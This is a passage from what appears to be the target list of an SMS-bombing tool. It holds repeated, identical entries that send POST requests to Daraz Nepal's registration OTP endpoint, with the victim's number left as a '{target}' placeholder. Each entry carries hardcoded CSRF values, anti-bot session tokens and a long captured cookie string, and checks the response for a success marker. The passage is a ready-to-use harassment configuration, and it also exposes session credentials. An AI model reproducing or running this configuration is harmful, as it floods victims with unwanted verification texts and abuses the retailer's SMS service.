_ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; 